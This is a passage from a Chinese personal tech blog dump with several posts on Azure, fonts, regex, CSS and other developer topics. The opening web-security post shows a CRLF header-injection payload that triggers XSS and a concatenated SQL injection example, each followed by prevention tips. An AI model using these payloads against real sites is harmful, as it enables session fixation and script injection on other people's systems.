在以下情况下发生HTTP响应拆分： 数据通过不受信任的来源进入Web应用程序，最常见的是HTTP请求。 数据包含在发送给Web用户的HTTP响应标头中，而不会对恶意字符进行验证。 对于HRS最简单的利用方式是注入两个\\r\\n，之后写入XSS代码，来构造一个XSS。 比如一个网站接受URL参数/redirect?url=，URL放在Response Location后面跳转。 Request1GET /redirect?url=new-page HTTP/1.1 Response12HTTP/1.1 302Location: new-page 如果我们输入的是 Request1GET /redirect?url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt; HTTP/1.1 Response1234HTTP/1.1 302Location: &lt;img src=1 onerror=alert(/xss/)&gt; 糟了，由于Location为空，Chrome并没有跳转，而是把两个CRLF后的&lt;ing&gt;渲染了出来，造成了XSS注入。 此攻击方式由于会注入返回头，危害大于XSS，其能够轻松修改返回头，导致浏览器XSS Auditor，Frame Deny等防护失效，还能恶意注入cookie的JSESSIONID实现会话固定漏洞。 预防 过滤\\r，\\n，并且避免输入的数据污染到其他HTTP头。 SQL 注入TODO SQL注入攻击通过从客户端或Web到服务端的输入数据包括SQL查询的注入。成功的SQL注入攻击可以从数据库读取敏感数据，修改数据库数据（插入/更新/删除），对数据库执行管理操作（如关闭DBMS），恢复DBMS文件中存在的给定文件的内容系统并在某些情况下向操作系统发出命令。 拼接注入1select * from users where username='test' and password=md5('test') 预防 对用户的输入进行校验，可以通过正则表达式，或限制长度。 使用参数化SQL或存储过程。 为每个应用使用单独的权限有限的数据库连接。 应用的异常信息应该给出尽可能少的提示，使用自定义的错误信息对原始错误信息进行包装。 参考文献 Cross-site Scripting (XSS) Types of Cross-Site Scripting HtmlEncode和JavaScriptEncode（预防XSS） Sanitize untrusted HTML (to prevent XSS) 安全隐患，你对X-XSS-Protection头部字段理解可能有误 XSS初体验 XSS Filter Evasion Cheat Sheet CKEditor Best Practices 深究AngularJS——$sce的使用 Web安全之CSRF攻击 新浪某站CRLF Injection导致的安全问题 固定SessionID 漏洞 攻击 用 sql 注入攻破一个网站 封面来源: pixabay, free for commercial use.","link":"/2019/web-security/"},{"title":"域名邮箱由 QQ邮箱 移到 Yandex","text":"用腾讯的域名邮箱服务主要为了方便国内访问，但一直有漏邮件的烦恼，所以一直没有作为主邮箱使用。直到前一段时间开始爆发式的漏，连验证码邮件都收不到了，于是我用 outlook 尝试给域名邮箱发了一封测试邮件，果然被退信了。 上网对比了一下，换成了网易的，结果设置MX记录验证过不去，让等48小时，等不了，再换。 现在换到了俄罗斯的 Yandex，初期体验还不错。 优点： 支持接收未注册地址的邮件（相当于发到 *@imaegoo.com 我都能收到） 支持配置全局转发，但不支持垃圾邮件转发 国内访问速度还不错 域名验证速度快，10分钟就能完成自助验证 支持从自己的域名（mail.imaegoo.com）进登录界面 缺点： 界面没有中文，英文界面下还经常出现俄文，国际化不够 ……过程就不细说了，登录 https://connect.yandex.ru/pdd/ 按步骤申请就可以，需要开着在线翻译面对随时可能出现的俄文。","link":"/2019/yandex-domain-mail/"},{"title":"基于 defuse&#x2F;php-encryption 的 AES 在线加解密工具","text":"由于网上现有的 AES 加解密工具似乎不能正常解密我们 Defuse 库加密出来的字符串，就写了一个加解密工具，方便开发时加密解密 AES，基于的是 defuse/php-encryption，部署在 Azure 应用服务上面。 输入密钥根据 README 描述，这个库似乎只支持 256-bit 的密钥，请使用 AES 密钥在线生成器 生成 256-bit 的密钥使用。 输入文本 加密 解密 加密 / 解密结果 function encrypt (decrypt, event) { event.target.classList.add('is-loading'); $('.key-button').attr('disabled', true); $.ajax({ type: 'POST', url: 'https://imaegoo.azurewebsites.net/api/encrypt.php', data: { key: $('#text-key').val(), text: $('#text-plain').val(), decrypt: decrypt }, dataType: 'text', success: function (data) { $('#text-encrypted').val(data); event.target.classList.remove('is-loading'); $('.key-button').attr('disabled', false); } }); } 相关代码encrypt.php12345678910111213141516171819use Defuse\\Crypto\\Crypto;use Defuse\\Crypto\\Exception as Ex;use Defuse\\Crypto\\Key;use Defuse\\Crypto\\Encoding;function encrypt($text, $key, $decrypt) { try { // Defuse PHP-Encryption requires a key object instead of a string. $key = Encoding::saveBytesToChecksummedAsciiSafeString(Key::KEY_CURRENT_VERSION, $key); $key = Key::loadFromAsciiSafeString($key); if ((bool) $decrypt) { return Crypto::decrypt((string) $text, $key); } else { return Crypto::encrypt((string) $text, $key); } } catch (Ex\\CryptoException $ex) { return $decrypt ? 'Decryption failed' : 'Encryption failed'; }} composer.json1234567{ ..., &quot;require&quot;: { &quot;php&quot;: &quot;&gt;=5.4.0&quot;, &quot;defuse/php-encryption&quot;: &quot;~2.0&quot; }} 来自 Drupal module - Real AES 的源码，有修改。","link":"/2020/aes-encryption/"},{"title":"AES 密钥在线生成器","text":"写了一个密钥生成器，方便开发时生成随机的 AES 密钥使用，部署在 Azure 应用服务上面。 生成代码keygen.php123456789function keygen($length) { $token = ''; $tokenlength = round($length * 4 / 3); for ($i = 0; $i &lt; $tokenlength; ++$i) { $token .= chr(rand(32, 1024)); } $token = base64_encode(str_shuffle($token)); return substr($token, 0, $length);} From: https://github.com/gladchinda/keygen-php/blob/master/src/Keygen/Generators/TokenGenerator.php 选择密钥长度 64-bit 128-bit 192-bit 256-bit 512-bit 1024-bit 2048-bit 4096-bit 生成结果 function keygen (bit, event) { event.target.classList.add('is-loading'); $('.key-button').attr('disabled', true); $.ajax({ type: 'POST', url: 'https://imaegoo.azurewebsites.net/api/keygen.php', data: { bit: bit }, dataType: 'text', success: function (data) { $('#key-result').val(data); event.target.classList.remove('is-loading'); localStorage.setItem('aes-keygen-' + new Date().toLocaleString(), data); $('.key-button').attr('disabled', false); } }); }","link":"/2020/aes-key-generator/"},{"title":"屏蔽安卓 QQ 8.2 聊天个性字体","text":"摸索过程我一直在用 Google Play 版本的 QQ，简洁没有花里胡哨的功能，要问我为什么不用 TIM？因为 TIM 实在太简洁了，连表情都不能下载。 今天突然发现 Play 里的 QQ 更新了！终于不是那个远古版本的 7.7.6 了。 我比较喜欢消息气泡，有时候我甚至可以看气泡认人，但我非常讨厌个性字体，一些字体的辨识度实在低，虽然可以双击查看消息，但能够屏蔽就舒服了。在 7.7.6 中我通过删除 Tencent/MobileQQ/.font_info 目录并创建同名文件来屏蔽字体，新版不起作用了。 找了一圈，发现是这个目录位置变了，现在是 Android/data/com.tencent.mobileqq/Tencent/MobileQQ/.font_info/。 马上删掉，创建同名文件！ 然后就遇到问题，QQ 学聪明了，删除了我创建的文件，然后重新加载了字体。 我又想到了给 000 权限，但是 Android 内部存储中的文件是不能设权限的，此路不通。 经过一番尝试，我找到了新的办法屏蔽字体，简而言之，就是用空文件替换所有的 ttf。 解决方法（无需 root）你可以用文件管理器来替换字体，但是字体太多，用 RE 一个个替换太麻烦，这里我们用 Termux 命令批量替换。 在Google Play或酷安搜索 Termux 安装，link：https://play.google.com/store/apps/details?id=com.termuxhttps://www.coolapk.com/apk/com.termux 打开 Termux，运行下列命令，以授权 Termux 访问内部存储 12apt update &amp;&amp; apt upgradetermux-setup-storage 定期打开 Termux 运行下列命令来清空字体 1truncate --size 0 ~/storage/shared/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/.font_info/**/*.ttf 这个方法不能一劳永逸，好像没有一劳永逸的办法？如果你有什么更好的办法，欢迎评论！ 4月28日更新一劳永逸的方法（需 root）首先结束运行 QQ，打开 RE 或类似的文件管理器，定位到如下路径： 1根目录/data/media/0/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/ 修改 .font_info 目录权限为 000，再清空 .font_info 目录，搞定。 &nbsp;&nbsp; Landscape Vectors by Vecteezy","link":"/2020/android-qq-block-font/"},{"title":"JDBC 连接 Azure Database for MySQL 报错 SSL peer shut down incorrectly 的解决","text":"这个问题找了一天的原因，如果你也遇到了这个问题，希望能帮到你。 完整错误信息： 点击展开 >folded1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757603-Jun-2020 07:52:22.772 SEVERE [main] org.apache.tomcat.jdbc.pool.ConnectionPool.init Unable to create initial connections of pool. com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failureThe last packet successfully received from the server was 384 milliseconds ago. The last packet sent successfully to the server was 376 milliseconds ago. at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490) at com.mysql.jdbc.Util.handleNewInstance(Util.java:411) at com.mysql.jdbc.SQLError.createCommunicationsException(SQLError.java:1117) at com.mysql.jdbc.ExportControlled.transformSocketToSSLSocket(ExportControlled.java:105) at com.mysql.jdbc.MysqlIO.negotiateSSLConnection(MysqlIO.java:5126) at com.mysql.jdbc.MysqlIO.proceedHandshakeWithPluggableAuthentication(MysqlIO.java:1666) at com.mysql.jdbc.MysqlIO.doHandshake(MysqlIO.java:1244) at com.mysql.jdbc.ConnectionImpl.coreConnect(ConnectionImpl.java:2397) at com.mysql.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:2430) at com.mysql.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:2215) at com.mysql.jdbc.ConnectionImpl.&lt;init&gt;(ConnectionImpl.java:813) at com.mysql.jdbc.JDBC4Connection.&lt;init&gt;(JDBC4Connection.java:47) at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490) at com.mysql.jdbc.Util.handleNewInstance(Util.java:411) at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:399) at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:334) at org.apache.tomcat.jdbc.pool.PooledConnection.connectUsingDriver(PooledConnection.java:319) at org.apache.tomcat.jdbc.pool.PooledConnection.connect(PooledConnection.java:212) at org.apache.tomcat.jdbc.pool.ConnectionPool.createConnection(ConnectionPool.java:744) at org.apache.tomcat.jdbc.pool.ConnectionPool.borrowConnection(ConnectionPool.java:676) at org.apache.tomcat.jdbc.pool.ConnectionPool.init(ConnectionPool.java:483) at org.apache.tomcat.jdbc.pool.ConnectionPool.&lt;init&gt;(ConnectionPool.java:154) at org.apache.tomcat.jdbc.pool.DataSourceProxy.pCreatePool(DataSourceProxy.java:118) at org.apache.tomcat.jdbc.pool.DataSourceProxy.createPool(DataSourceProxy.java:107) at org.apache.tomcat.jdbc.pool.DataSourceFactory.createDataSource(DataSourceFactory.java:560) at org.apache.tomcat.jdbc.pool.DataSourceFactory.getObjectInstance(DataSourceFactory.java:244) at org.apache.naming.factory.FactoryBase.getObjectInstance(FactoryBase.java:96) at java.naming/javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:325) at org.apache.naming.NamingContext.lookup(NamingContext.java:857) at org.apache.naming.NamingContext.lookup(NamingContext.java:160) at org.apache.naming.NamingContext.lookup(NamingContext.java:843) at org.apache.naming.NamingContext.lookup(NamingContext.java:174) at org.apache.catalina.core.NamingContextListener.addResource(NamingContextListener.java:1017) at org.apache.catalina.core.NamingContextListener.createNamingContext(NamingContextListener.java:557) at org.apache.catalina.core.NamingContextListener.lifecycleEvent(NamingContextListener.java:253) at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123) at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:924) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.startup.Catalina.start(Catalina.java:633) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.base/java.lang.reflect.Method.invoke(Method.java:566) at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:344) at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:475) Caused by: javax.net.ssl.SSLHandshakeException: Remote host terminated the handshake at java.base/sun.security.ssl.SSLSocketImpl.handleEOF(SSLSocketImpl.java:1322) at java.base/sun.security.ssl.SSLSocketImpl.decode(SSLSocketImpl.java:1160) at java.base/sun.security.ssl.SSLSocketImpl.readHandshakeRecord(SSLSocketImpl.java:1063) at java.base/sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:402) at com.mysql.jdbc.ExportControlled.transformSocketToSSLSocket(ExportControlled.java:90) ... 44 more Suppressed: java.net.SocketException: Broken pipe (Write failed) at java.base/java.net.SocketOutputStream.socketWrite0(Native Method) at java.base/java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:110) at java.base/java.net.SocketOutputStream.write(SocketOutputStream.java:150) at java.base/sun.security.ssl.SSLSocketOutputRecord.encodeAlert(SSLSocketOutputRecord.java:81) at java.base/sun.security.ssl.TransportContext.fatal(TransportContext.java:351) at java.base/sun.security.ssl.TransportContext.fatal(TransportContext.java:263) at java.base/sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:405) ... 45 more Caused by: java.io.EOFException: SSL peer shut down incorrectly at java.base/sun.security.ssl.SSLSocketInputRecord.decode(SSLSocketInputRecord.java:167) at java.base/sun.security.ssl.SSLTransport.decode(SSLTransport.java:108) at java.base/sun.security.ssl.SSLSocketImpl.decode(SSLSocketImpl.java:1152) ... 47 more 提取关键信息： 12Caused by: javax.net.ssl.SSLHandshakeException: Remote host terminated the handshakeCaused by: java.io.EOFException: SSL peer shut down incorrectly 得知 SSL 握手失败，于是我找了 Azure 的示例代码（https://docs.azure.cn/zh-cn/mysql/connect-java）来测，也是同样的问题。 又参考了《How to configure spring boot application to use SSL/TLS over MySQL?》去信任 Azure 的 CA 证书，仍然不起作用。 最后发现是我用的 mysql-connector-java 版本过低导致，我们使用的 Camunda 的 docker 镜像内置了 5.1.21 的数据库驱动，我的测试代码也是同样的版本，连接不上，只要升级到目前的最新版 5.1.49，问题就解决了。 另一个坑，如果收到提示 1ERROR 9002 (28000): The connection string may not be right. Please visit portal for references. 一般是连接用户名没有加实例名，比如数据库地址是 abc123.mysql.database.chinacloudapi.cn，那么连接用户名要以 @abc123 结尾。 还有 Azure 整理了一个使用数据库时的常见问题列表，里面有很多问题都会踩到，建议看看—— https://docs.azure.cn/zh-cn/mysql-database-on-azure/mysql-database-tech-faq","link":"/2020/azure-mysql-jdbc-ssl-issue/"},{"title":"体验 Azure 应用服务：可以白嫖的 OneIndex 空间","text":"之前已经写过一篇如何使用 Azure DevOps 实现自动部署 Hexo 的文章，这个月，受疫情影响在家，就把自己的 Azure 新用户体验账号开了，获得了限时 1 个月 200 刀的体验额度。 之后研究中发现了 Azure 提供的应用服务还挺好用的，当然重点是——可以白嫖！ 免费套餐当然是有限制的—— 配置上，1G内存，每天最多1小时CPU时间（计算量不大24小时开着没问题） 330M 左右的出站流量 无法绑定自定义域名，只能使用 *.azurewebsites.net 没有数据库，可以另建 MySQL，但不是免费的，想搭建 Typecho 和 Wordpress 的还是别想了 无国内节点，可选日本节点 需要 Azure 账号，也就是需要 VISA 或者 Master 卡 我们可以在上面部署 .Net Core, ASP.NET, Java, Node.js, PHP, Python, Ruby 语言的项目。 之前有访问过别人的 PyOne，发现下载速度还挺快，就一直想用 OneDrive 搭建一个自己的网盘，机会来了。 主流的 OneDrive 第三方 Directory Index，有老牌的 oneindex，还有后起之秀 PyOne 和 OLAINDEX，虽然 Azure 的 PHP 环境可以自动识别 composer 安装依赖，也支持执行部署脚本、执行 php 命令，但是由于 PyOne 还要依赖 Python 环境，OLAINDEX 还要依赖 Nginx，别想了，搭建不了。 当我尝试在 Azure 应用服务上面部署 OLAINDEX 时，在执行安装脚本 php artisan od:install 时出错，遇到的错误是 SQLite General error: 5 database is locked，由于完全不会 PHP，就放弃了。 好了，就决定是 OneIndex 了！高手看到这里基本就可以自己去尝试了，下面是我的步骤。 申请 Azure 账号申请一个国际版 Azure 的体验账户，需要注意 Azure 不审核国内用户申请国际账户，国内放心申请。鉴于每人有一次限时 1 个月 200 刀的体验额度的机会，请想好了再申请。 步骤略。 建立 Web 应用 资源组选已有的，没有就新建一个。 Web 应用名称就是二级域名，需要唯一。 运行时堆栈选择 PHP 7.3。 区域选择 Japan East 或 Japan West。 SKU 和大小选择“开发/测试”中的“免费”。 准备部署进入建好的应用服务，选择左侧的“部署中心”。 有许多种部署方式可以选择，FTP 方式非常慢，GitHub 方式需要授权，建议选择本地 Git 部署。 接下来选择选择应用服务生成服务，因为我们没有部署脚本，用不到 Azure Pipelines。 部署设置完成后，点击上边的“部署凭据”，之后的步骤会需要这里的 Git URL、用户名、密码。 开始部署在本地执行命令来部署： 1234git clone https://github.com/donwa/oneindex.gitcd oneindexgit remote add azure &lt;你的部署 URL&gt;git push azure -f 输入上一步中的用户名和密码，即可开始部署。 访问应用地址，如 https://imaegoo.azurewebsites.net，根据安装向导配置应用ID和机密，部署完成！","link":"/2020/azure-app-service/"},{"title":"网页中文字体压缩（woff2）、拆分、去繁体字库，提高加载速度","text":"从客户得到的网页字体足足有 10MB 大小，会严重拖慢网页加载，如何处理？ 阅读下面的解决方法前，建议先阅读网页字体优化，了解一些基本知识以及这么做的原因。 字体去繁体GBK 结尾的字体偏大的原因是包含庞大的繁体字库，大多数网页并不需要，可以使用 fontTools 得到字体的简体中文子集。 安装 Python 3.7 和 pip，再运行 pip install fonttools 来安装 fontTools。 运行 pyftsubset --help 查看命令帮助，得知需要 Unicode 列表来提取字体子集。 我们看一下 Unicode 表： 字符集 字数 Unicode 编码 基本汉字 20902字 4E00-9FA5 基本汉字补充 74字 9FA6-9FEF 扩展A 6582字 3400-4DB5 扩展B 42711字 20000-2A6D6 扩展C 4149字 2A700-2B734 扩展D 222字 2B740-2B81D 扩展E 5762字 2B820-2CEA1 扩展F 7473字 2CEB0-2EBE0 扩展G 4939字 30000-3134A 康熙部首 214字 2F00-2FD5 部首扩展 115字 2E80-2EF3 兼容汉字 477字 F900-FAD9 兼容扩展 542字 2F800-2FA1D PUA(GBK)部件 81字 E815-E86F 部件扩展 452字 E400-E5E8 PUA增补 207字 E600-E6CF 汉字笔画 36字 31C0-31E3 汉字结构 12字 2FF0-2FFB 汉语注音 43字 3105-312F 注音扩展 22字 31A0-31BA 〇 1字 3007 * 转载自汉字 Unicode 编码范围 这里会遇到一个问题，基本汉字（4E00-9FA5）区间内，简体字、繁体字是交叉的，没有一个固定的简体区间和繁体区间，所以需要一个简体字的 Unicode 表，经过整理，我得到最终的 unicodes 文件，再加入 latin 的区间（0000-00FF），以及中文标点符号，作为参数传入 fontTools 获得字体子集。 你可以直接从 Gist 下载我整理好的文件：sc_unicode.txt，并和需要处理的字体放在一起。 1pyftsubset fang-zheng-hei-ti-gbk.ttf --unicodes-file=sc_unicode.txt 该命令会压缩方正黑体，执行后可在同目录下找到 fang-zheng-hei-ti-gbk.subset.ttf，字体大小变为原来的 27.6% 122020/05/13 10:53 2,823,032 fang-zheng-hei-ti-gbk.subset.ttf2020/05/12 11:09 10,210,812 fang-zheng-hei-ti-gbk.ttf 字体压缩编译安装 Google woff2（笔者的环境是 Ubuntu 16.04） 1234sudo apt-get install -y git g++ makegit clone --recursive https://github.com/google/woff2.gitcd woff2make clean all 再压缩字体 123./woff2_compress ./fang-zheng-hei-ti-gbk.ttfProcessing ./fang-zheng-hei-ti-gbk.ttf =&gt; ./fang-zheng-hei-ti-gbk.woff2Compressed 6760548 to 3704803. 122020/05/12 11:09 10,210,812 fang-zheng-hei-ti-gbk.ttf2020/05/12 17:29 3,704,896 fang-zheng-hei-ti-gbk.woff2 可见对方正黑体进行压缩后，压缩比 36.3% 如果配合去繁体使用，最终字体大小只有 1.09 MB (1,148,408 bytes)，效果显著。 最终使用时，还需要考虑 woff2 的浏览器兼容问题，提供多种格式（woff 和 ttf）保证兼容。 字体拆分请阅读：Unicode-range 子集内嵌 参考资料 网页字体优化 https://developers.google.cn/web/fundamentals/performance/optimizing-content-efficiency/webfont-optimization?hl=zh-cn fontTools Docs https://fonttools.readthedocs.io/en/latest/ 汉字 Unicode 编码范围 https://www.qqxiuzi.cn/zh/hanzi-unicode-bianma.php Unicode Table for Simplified Chinese Characters https://www.ansell-uebersetzungen.com/gbuni.html &nbsp;&nbsp; Landscape Vectors by Vecteezy","link":"/2020/chinese-font-compress/"},{"title":"屏蔽 Chrome for Windows “请停用以开发者模式运行的扩展程序” 提示","text":"开发过 Chrome 扩展的人都知道，加载已解压的扩展之后，Chrome 每次启动会弹窗警告，这个警告在新 Edge 中叫 “禁用开发人员模式扩展” 。 这个提示在打开浏览器几秒之后出现，并夺走窗口焦点，很是烦人，如何屏蔽呢？ 搜索之后，发现网友小茗同学给出了一个修改 dll 文件的方案，方案危险系数较高，并且会随着 Chrome 更新而失效，有没有更好的办法呢？ 我使用的火绒杀毒提供了一个弹窗拦截工具，很好地解决了这个问题。 打开火绒 - 安全工具 - 弹窗拦截 打开 Chrome 并等待警告出现 选择弹窗拦截中的截图拦截 选择 Chrome 上的警告窗口 选择 “关闭” 这样一来，警告没有消失，但每次都会被自动关闭，安全有效。 2020年3月24日更新谷歌访问助手项目的 Wiki 中介绍过如何将第三方插件加入白名单，这种方法解决了安装之后无法启用第三方插件的问题，但是，经测试仍然会有“请停用”警告弹窗，有兴趣研究的可以看看。https://github.com/haotian-wang/google-access-helper/wiki/Installation-Guide#%E6%96%B9%E6%B3%952%E7%9B%B4%E6%8E%A5%E5%AE%89%E8%A3%85crx%E6%96%87%E4%BB%B6","link":"/2020/chrome-disable-development-warning/"},{"title":"理解 Javascript，PHP，SQL 匹配中文姓名正则表达式的区别","text":"如何定义合法姓名中文姓名非常多样化，想要真正区别出姓名和非姓名非常困难，但在这篇文章中，作为前提，我们认为合法的中文姓名由 1~10 个中文字符组成。 Javascript知道了这个前提，容易得出 JS 的正则表达式—— 姓名正则1/^([\\u4e00-\\u9fa5]{1,10})$/ 通俗解释： ^ 匹配开头；\\u4e00 代表第一个汉字“一”；\\u9fa5 代表最后一个汉字“龥”；[\\u4e00-\\u9fa5] 匹配一个中文字符；{1,10} 这个中文字符出现 1 到 10 次；$ 匹配结尾。 测试一下—— Javascript12345const CHINESE_NAME_PATTERN = /^([\\u4e00-\\u9fa5]{1,10})$/;console.log(CHINESE_NAME_PATTERN.test('张三')); // trueconsole.log(CHINESE_NAME_PATTERN.test('iMaeGoo')); // falseconsole.log(CHINESE_NAME_PATTERN.test('张三1')); // falseconsole.log(CHINESE_NAME_PATTERN.test('1张三')); // false PHPPHP 中不认 \\u4e00，需要稍微变换一下语法—— PHP12345&lt;?phpecho preg_match('/^[\\x{4e00}-\\x{9fa5}]{1,10}$/u', '张三'); // 1echo preg_match('/^[\\x{4e00}-\\x{9fa5}]{1,10}$/u', 'iMaeGoo'); // 0echo preg_match('/^[\\x{4e00}-\\x{9fa5}]{1,10}$/u', '张三1'); // 0echo preg_match('/^[\\x{4e00}-\\x{9fa5}]{1,10}$/u', '1张三'); // 0 结尾的 u 是什么意思？官方文档 中有描述： u (PCRE_UTF8)此修正符打开一个与 perl 不兼容的附加功能。 模式和目标字符串都被认为是 utf-8 的。 无效的目标字符串会导致 preg_* 函数什么都匹配不到； 无效的模式字符串会导致 E_WARNING 级别的错误。 PHP 5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效（resp. PCRE 7.3 2007-08-28）。 以前就被认为是无效的 UTF-8。 MySQLSQL 中也无法直接写 Unicode 转义 \\u4e00，需要使用 HEX 将汉字转哈希之后，再匹配汉字的哈希值。 汉字的 HEX 范围：E4B880 ~ E9BEA5，所以可以用 e[4-9][0-9a-f]{4} 代表一个中文字符。 SQL123456SELECT HEX('一'); # 'E4B880'SELECT HEX('龥'); # 'E9BEA5'SELECT HEX('张三') REGEXP '^(e[4-9][0-9a-f]{4}){1,10}$'; # 1SELECT HEX('iMaeGoo') REGEXP '^(e[4-9][0-9a-f]{4}){1,10}$'; # 0SELECT HEX('张三1') REGEXP '^(e[4-9][0-9a-f]{4}){1,10}$'; # 0SELECT HEX('1张三') REGEXP '^(e[4-9][0-9a-f]{4}){1,10}$'; # 0 拓展细心的读者可能会发现，HEX 输出的是大写字母 E，为什么匹配的时候用的是小写字母 e？其实这也是 MySQL 正则与 JS 正则的不同之一。 SQL 中，REGEXP 是不区分大小写匹配，REGEXP BINARY 是区分大小写匹配。JS 中，/.../ 是区分大小写匹配，/.../i 是不区分大小写匹配。","link":"/2020/chinese-name-regexp/"},{"title":"纯 CSS 实现椭圆轨迹旋转小球","text":"话不多说看效果 .frame { background-color: #EEEEEE; position: relative; width: 300px; height: 200px; } .ball { width: 100px; height: 100px; border-radius: 100%; position: absolute; animation: animX 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate, animY 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate, scale 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate; } .ball.one { background-color: #FFFFCC; animation-delay: -6s, -4.5s, -4.5s; } .ball.two { background-color: #CCFFFF; animation-delay: -4s, -2.5s, -2.5s; } .ball.three { background-color: #FFCCCC; animation-delay: -2s, -0.5s, -0.5s; } @keyframes animX { 0% { left: 0px; } 100% { left: 200px; } } @keyframes animY { 0% { top: 0px; } 100% { top: 100px; } } @keyframes scale { 0% { transform: scale(0.7); } 100% { transform: scale(1); } } 相关代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;div class=&quot;frame&quot;&gt; &lt;div class=&quot;ball one&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ball two&quot;&gt;&lt;/div&gt; &lt;div class=&quot;ball three&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;style&gt;.frame { background-color: #EEEEEE; position: relative; width: 300px; height: 200px;}.ball { width: 100px; height: 100px; border-radius: 100%; position: absolute; animation: animX 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate, animY 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate, scale 3s cubic-bezier(0.36, 0, 0.64, 1) infinite alternate;}.ball.one { background-color: #FFFFCC; animation-delay: -6s, -4.5s, -4.5s;}.ball.two { background-color: #CCFFFF; animation-delay: -4s, -2.5s, -2.5s;}.ball.three { background-color: #FFCCCC; animation-delay: -2s, -0.5s, -0.5s;}@keyframes animX { 0% { left: 0px; } 100% { left: 200px; }}@keyframes animY { 0% { top: 0px; } 100% { top: 100px; }}@keyframes scale { 0% { transform: scale(0.7); } 100% { transform: scale(1); }}&lt;/style&gt; 解析设置动画，分别控制小球 x 轴，y 轴，以及缩放比。先画张图，把小球 x 轴、y 轴的位置、缩放比与时间的关系用坐标系表示出来—— 通过这张画图可以看出—— 想顺时针，x 轴运动需要比 y 轴运动提前 1/4 个周期，逆时针则延后 1/4 个周期； 三个小球想均匀分布，需要两两错开 1/3 个周期； y 轴到达最高点时，球距离最远，y 轴到达最低点时，球距离最近，近大远小，y 轴位置和缩放比是正相关。 我们动画一个周期是 6 秒，理解了这些，就可以写出相应的 animation 出来了。 参考https://www.jb51.net/css/643232.html","link":"/2020/css-rotating-ball/"},{"title":"神奇的 @media (prefers-color-scheme: dark)","text":"夜间模式已经实现很久了，当初有人跟我讲，可以增加一个按时间切换的功能。 直到我在无意间查看 Reabble 阅读器的 CSS 样式时，发现了 @media (prefers-color-scheme: dark) 选择器。 来自：prefers-color-scheme - CSS（层叠样式表） | MDNprefers-color-scheme CSS 媒体特性用于检测用户是否有将系统的主题色设置为亮色或者暗色。 简而言之，就是可以实现随系统（或浏览器）的深、浅色模式设置，改变网页配色。 我觉得这是比按时间切换更好的一个实现，跟随系统设置比跟随时间更加人性化一些，毕竟还有我这种，白天开深色，晚上开浅色的异类（逃）","link":"/2020/css-prefers-color-scheme/"},{"title":"解决 Edge 浏览器 SCRIPT5022: Exception thrown and not caught","text":"JS 代码在 Safari, Chrome, Firefox 都是好的，就只有 Edge 莫名其妙地报错。 1SCRIPT5022: Exception thrown and not caught 未捕获的异常？EXM？你倒是说是什么异常啊？行号还是错的？点过去无法定位错误位置？hash-navigation.js？我的项目里根本都没有这个 js 啊喂！ 后来怎么解决的呢？因为这个错误是在滚轮滚动的时候打出来的，我在项目中各个 onScroll 方法外层加了 try catch 块。 12345try { // ...} catch (e) { console.log(e)} 于是真相水落石出了。 某处代码迭代了 DOM 元素，而在 Edge 中，document.getElementsByClassName 的返回不支持迭代，其他浏览器不存在这个问题。 1234const doms = document.getElementsByClassName('some-class')for (const dom of doms) { // Edge 会报错 // ...} 换一种兼容性更好的迭代方式就好了 12345const doms = document.getElementsByClassName('some-class')for (let i = 0; i &lt; doms.length; i++) { // Edge 不会报错了 const dom = doms[i] // ...} 如果你也遇到了这个异常，可以试试加 try catch 的办法，从而定位问题根源。","link":"/2020/edge-error/"},{"title":"记录 Drupal 配置 monolog 遇到的坑","text":"在开发 Drupal CMS 网站时，我们发现 Drupal 默认的日志记录在 watchdog 数据表中，为了把日志记录在文件、控制台输出，可以使用 monolog 模块。这个模块提供的文档较少，在此记录一下遇到的问题。 TOC 启用模块报错 The service “monolog.handler.rotating_file” has a dependency on a non-existent parameter “monolog.level.debug”. 修改日志格式为 JSON 输出到控制台（在 Drupal 运行在 Docker 容器中时非常有用） arguments 的配置 processors 的配置 分离 INFO 和 ERROR 启用模块报错阅读模块的 README 之后，我按照 Quick start 一模一样地配置了相应的文件 You 